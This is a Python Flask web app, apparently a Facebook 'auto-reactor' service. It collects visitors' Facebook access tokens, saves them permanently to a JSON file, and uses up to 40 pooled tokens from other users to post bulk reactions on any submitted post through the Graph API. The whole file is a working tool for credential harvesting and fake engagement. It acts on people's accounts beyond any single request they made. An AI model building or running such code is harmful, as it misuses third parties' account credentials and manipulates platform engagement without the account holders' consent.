from flask import Flask, request, render_template, jsonify
import requests
import json
import re
import time

app = Flask(__name__)

COOLDOWN_PERIOD = 25 * 60  # 25 minutes in seconds
LAST_SUBMISSION_TIME = 0

def load_data():
    try:
        with open('reactors.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"access_tokens": []}
    except json.decoder.JSONDecodeError:
        return {"access_tokens": []}

def save_data(data):
    with open('reactors.json', 'w') as f:
        json.dump(data, f, indent=4)

def extract_ids(url):
    group_pattern = r'groups/(\d+)/permalink/(\d+)/'
    post_pattern = r'(\d+)/posts/(\d+)/'
    photo_pattern = r'fbid=(\d+)'

    group_match = re.search(group_pattern, url)
    post_match = re.search(post_pattern, url)
    photo_match = re.search(photo_pattern, url)

    if group_match:
        group_id, post_id = group_match.groups()
        return f"{group_id}_{post_id}"
    elif post_match:
        group_id, post_id = post_match.groups()
        return f"{group_id}_{post_id}"
    elif photo_match:
        photo_id = photo_match.group(1)
        return photo_id
    else:
        return None

def perform_reaction(post_id, reaction_type, access_tokens):
    limited_tokens = access_tokens[:40]
    for access_token in limited_tokens:
        try:
            url = f'https://graph.facebook.com/v18.0/{post_id}/reactions'
            params = {'access_token': access_token, 'type': reaction_type}
            response = requests.post(url, params=params)
            if response.status_code == 200:
                print(f"SUCCESSFULLY REACTED | {post_id} | {str(response.json())}")
            else:
                print(f"FAILED TO POST REACTION | {post_id}")
        except requests.exceptions.RequestException as error:
            print(f"[EXCEPTION] {error}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/handle_request', methods=['POST'])
def handle_request():
    global LAST_SUBMISSION_TIME

    current_time = time.time()
    if current_time - LAST_SUBMISSION_TIME < COOLDOWN_PERIOD:
        return jsonify({"message": f"Cooldown period in effect. Please wait {int((COOLDOWN_PERIOD - (current_time - LAST_SUBMISSION_TIME)) / 60)} minutes."}), 429

    access_token = request.form['access_token']
    link = request.form['link']
    reaction_type = request.form['reaction_type'].upper()
    
    data = load_data()
    access_tokens = data.get("access_tokens", [])

    if access_token in access_tokens:
        return jsonify({"message": "Token already exists"}), 400

    try:
        response = requests.get(f'https://graph.facebook.com/me?access_token={access_token}')
        if response.status_code == 200:
            access_tokens.append(access_token)
            data['access_tokens'] = access_tokens
            save_data(data)

            post_id = extract_ids(link)
            if not post_id:
                return jsonify({"message": "Invalid link"}), 400
            if reaction_type not in ['LIKE', 'LOVE', 'SAD', 'ANGRY', 'HAHA', 'WOW']:
                return jsonify({"message": "Invalid reaction type"}), 400
            perform_reaction(post_id, reaction_type, access_tokens)

            LAST_SUBMISSION_TIME = current_time
            return jsonify({"message": "Success"}), 200
        else:
            return jsonify({"message": "Invalid token"}), 400
    except requests.exceptions.RequestException as e:
        return jsonify({"message": "Invalid token"}), 400

    return jsonify({"message": "Invalid token"}), 400

if __name__ == "__main__":
    app.run(debug=True)
 
